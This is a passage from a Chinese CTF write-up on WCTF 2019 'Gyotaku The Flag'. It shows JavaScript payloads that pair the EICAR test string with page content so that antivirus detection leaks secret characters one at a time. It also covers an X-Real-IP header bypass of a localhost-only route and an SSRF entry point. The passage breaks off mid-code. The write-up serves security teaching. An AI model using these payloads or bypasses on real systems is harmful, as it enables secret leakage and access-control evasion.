fjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912100648.png" alt=""></p><p>Done! 触发了恶意内容检测。</p><p>那如果我们把 EICAR 内容进行一下拆分呢？</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">var</span> body = <span class="hljs-built_in">document</span>.body.innerHTML;</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> mal = <span class="hljs-string">"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H"</span> + body[<span class="hljs-number">0</span>];</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-built_in">eval</span>(mal);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912103004.png" alt=""></p><p>这里我们获取的是<code>&lt;body&gt;</code>标签中的第一个字符，也就是<code>a</code>，不构成 EICAR 测试样本，所以触发不了 Windows Defender 也很正常。</p><p>那我们改一下<code>&lt;body&gt;</code>标签当中的内容呢？使用<code>*</code>试试看</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">var</span> body = <span class="hljs-built_in">document</span>.body.innerHTML;</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> mal = <span class="hljs-string">"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H"</span> + body[<span class="hljs-number">0</span>];</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-built_in">eval</span>(mal);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912103146.png" alt=""></p><p>很棒，意料之中地触发了 Windows Defender。</p><h3 id="Go-Hacking"><a href="#Go-Hacking" class="headerlink" title="Go Hacking"></a>Go Hacking</h3><p>那触发 Windows Defender 会有什么问题吗？虽然这里看似没什么毛病，但是放到业务代码里面就不一样了。</p><p>仔细想想一般程序猿会这么写文件呢？细心的程序猿在进行写文件之后要 check 一遍是否写入成功，类似:</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$err = file_put_contents(<span class="hljs-string">'/tmp/file_name'</span>, <span class="hljs-string">'something need to be saved'</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>(!$err)</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-keyword">Exception</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>file_put_contents</code>在写入成功后返回写入多少个字节，失败的时候返回<code>False</code>，然后我们就可以利用这个特性，当我们写入恶意数据的时候，因为 Windows Defender 检查出恶意内容，禁止了用户读取权限或者删除了文件，导致服务因为检查写入不成功抛出异常，而对于我们来说可能直接返回错误的状态码类似 500 。</p><p>所以我们可以总结一下，大致我们可以有这么一套侧信道攻击的攻击链：</p><p></p><figure class="highlight livescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval<span class="hljs-function"><span class="hljs-params">(<span class="hljs-string">"EICA"</span>+input)</span> -&gt;</span> ?</span><br><span class="line">    detected<span class="hljs-function"> -&gt;</span> input <span class="hljs-keyword">is</span> <span class="hljs-string">'R'</span></span><br><span class="line">    <span class="hljs-keyword">not</span> detected<span class="hljs-function"> -&gt;</span> input <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-string">'R'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>如果内容中有<code>&lt;body&gt;</code>标签，并且如果有无法通过正常手段读到的数据，我们可以尝试用这种类似“盲注”的方式去获取秘密数据</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JavaScript can access the elements :)</span><br><span class="line">○ if they have <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> tag</span><br><span class="line">○ <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-javascript"><span class="hljs-built_in">document</span>.body.innerHTML[<span class="hljs-number">0</span>]</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>[secret]<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里需要注意的是，Tokyo Westerns 指出使用<code>if</code>语句构造的 EICAR 样本，Windows Defender 是不会检测出来的，例如以下 payload ，<code>mal</code>已经可以构造出 EICAR 样本，但是不会触发 Windows Denfender 的，但是大致思路我们可以通过这段代码来理解</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> n = <span class="hljs-string">'a'</span>;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">if</span>(<span class="hljs-built_in">document</span>.body.innerHTML[<span class="hljs-number">0</span>] &gt; <span class="hljs-string">'a'</span>)</span></span><br><span class="line"><span class="hljs-actionscript">n = <span class="hljs-string">'*'</span>;</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> mal = <span class="hljs-string">"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H"</span> + n;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-built_in">eval</span>(mal);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>flag{aaa}<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>然后我们大致修改一下，不使用<code>if</code>作为判断选择条件，使用<code>Math.min()</code>作为判断选择，所以大致我们可以得到这么个 payload :</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">var</span> num = <span class="hljs-number">90</span>;</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">document</span>.body.innerHTML[<span class="hljs-number">0</span>].charCodeAt(<span class="hljs-number">0</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> mal = <span class="hljs-string">"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H"</span> + {[num] : <span class="hljs-string">'*'</span>}[<span class="hljs-built_in">Math</span>.min(num ,body)];</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">eval</span>(mal);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>flag{aaa}<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>因为<code>body</code>获取到的是<code>f</code>的 ascii 码为 102 ，大于 90 ，所以<code>Math.min()</code>返回值为 90 ，<code>{[num]:'*'}</code>创建了一个 key 为 90 ，value 为 <code>*</code> 的对象，这里注意需要用<code>[num]</code>把<code>num</code>当作变量，因为如果直接使用<code>{num:'*'}</code>，这样是创建了一个 key 为 num 的一个字符串， value 为 <code>*</code> 的对象</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;     <span class="hljs-keyword">var</span> num = <span class="hljs-number">90</span>;</span><br><span class="line"><span class="hljs-literal">undefined</span></span><br><span class="line">&gt;     <span class="hljs-keyword">var</span> n = {<span class="hljs-attr">num</span> : <span class="hljs-string">'*'</span>};</span><br><span class="line"><span class="hljs-literal">undefined</span></span><br><span class="line">&gt;     <span class="hljs-built_in">console</span>.log([num]);</span><br><span class="line">[ <span class="hljs-number">90</span> ]</span><br><span class="line"><span class="hljs-literal">undefined</span></span><br><span class="line">&gt;     <span class="hljs-built_in">console</span>.log(n[num]);</span><br><span class="line"><span class="hljs-literal">undefined</span></span><br><span class="line"><span class="hljs-literal">undefined</span></span><br><span class="line">&gt;     <span class="hljs-built_in">console</span>.log(n[<span class="hljs-string">'num'</span>]);</span><br><span class="line">*</span><br><span class="line"><span class="hljs-literal">undefined</span></span><br><span class="line">&gt;     <span class="hljs-built_in">console</span>.log(n);</span><br><span class="line">{ <span class="hljs-attr">num</span>: <span class="hljs-string">'*'</span> }</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912130704.png" alt=""></p><p>这样我们就可以通过“盲注”的方式获取<code>&lt;body&gt;</code>标签中的秘密数据了。</p><h2 id="Gyotaku-The-Flag"><a href="#Gyotaku-The-Flag" class="headerlink" title="Gyotaku The Flag"></a>Gyotaku The Flag</h2><p>题目源码在 <a href="https://github.com/icchy/wctf2019-gtf" target="_blank" rel="noopener">Gyotaku The Flag</a>，slides 在 <a href="https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf" target="_blank" rel="noopener">WCTF2019: Gyotaku The Flag</a></p><p>有了以上的知识，让我们回到 WCTF 2019 Gyotaku The Flag 这道题上，这道题有这么几个路由</p><p></p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">e.GET(<span class="hljs-string">"/"</span>, IndexHandler(dbconn), LoginRequiredMiddleware)</span><br><span class="line">e.GET(<span class="hljs-string">"/gyotaku"</span>, GyotakuListHandler(dbconn), LoginRequiredMiddleware)</span><br><span class="line">e.GET(<span class="hljs-string">"/gyotaku/:gid"</span>, GyotakuViewHandler(dbconn), LoginRequiredMiddleware)</span><br><span class="line">e.GET(<span class="hljs-string">"/flag"</span>, FlagHandler, InternalRequiredMiddleware)</span><br><span class="line"></span><br><span class="line">e.POST(<span class="hljs-string">"/login"</span>, LoginHandler(dbconn))</span><br><span class="line">e.POST(<span class="hljs-string">"/gyotaku"</span>, GyotakuHandler(dbconn), LoginRequiredMiddleware)</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="So-easy-to-GetFlag"><a href="#So-easy-to-GetFlag" class="headerlink" title="So easy to GetFlag"></a>So easy to GetFlag</h3><p>在<code>/flag</code>的路由上有一个类似于中间件的功能：<code>InternalRequiredMiddleware</code></p><p></p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InternalRequiredMiddleware</span><span class="hljs-params">(next echo.HandlerFunc)</span> <span class="hljs-title">echo</span>.<span class="hljs-title">HandlerFunc</span></span> {</span><br><span class="line">true<span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c echo.Context)</span> <span class="hljs-title">error</span></span> {</span><br><span class="line">truetrueip := net.ParseIP(c.RealIP())</span><br><span class="line">truetruelocalip := net.ParseIP(<span class="hljs-string">"127.0.0.1"</span>)</span><br><span class="line">truetrue<span class="hljs-keyword">if</span> !ip.Equal(localip) {</span><br><span class="line">truetruetrue<span class="hljs-keyword">return</span> echo.NewHTTPError(http.StatusForbidden)</span><br><span class="line">truetrue}</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> next(c)</span><br><span class="line">true}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>以及 <code>FlagHandler</code>:</p><p></p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FlagHandler</span><span class="hljs-params">(c echo.Context)</span> <span class="hljs-title">error</span></span> {</span><br><span class="line">truedata, err := ioutil.ReadFile(<span class="hljs-string">"flag"</span>)</span><br><span class="line">true<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> err</span><br><span class="line">true}</span><br><span class="line">true<span class="hljs-keyword">return</span> c.String(http.StatusOK, <span class="hljs-keyword">string</span>(data))</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>可以看到这是一个控制只能<code>127.0.0.1</code>访问的功能函数，用于构造题目的 SSRF 这么一个类似的关卡，可是由于出题人不是特别细心，<code>echo.Context.RealIP</code>可以被<code>X-Real-IP</code>绕过，所以导致了当时很多人直接通过这个方式拿到了 flag …</p><p><del>题目结束，分析完了，关了吧别看了，后面都是扯淡，拿到 flag 就是王道，管他用什么方式</del></p><h3 id="The-better-way-to-GetFlag"><a href="#The-better-way-to-GetFlag" class="headerlink" title="The better way to GetFlag"></a>The better way to GetFlag</h3><p>好了，我们接下来分析分析比较有意思的预期解。</p><p><code>/login</code>路由比较简单，使用的是<code>goleveldb</code>做的数据操作</p><p><code>/gyotaku</code>路由 GET 方法列举用户有多少金坷垃</p><p><code>/gyotaku/:gid</code>从文件中查找<code>gid</code></p><p>我们可以在<code>/gyotaku</code>路由的 POST 方法中看到接收了一个 url 参数，并对 url 进行了请求：</p><p></p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url := c.FormValue(<span class="hljs-string">"url"</span>)</span><br><span class="line">...</span><br><span class="line">resp, err := http.Get(url)</span><br></pre></td></tr></tbody></table></figure><p></p><p>这就是我们需要的 SSRF 的点了，传入 url 让服务器请求这个 URL 。</p><p>然后我们可以接着往下看，注意到有个写文件的操作：</p><p></p><figure class="highlight go hljs"><table><tbody><tr><td 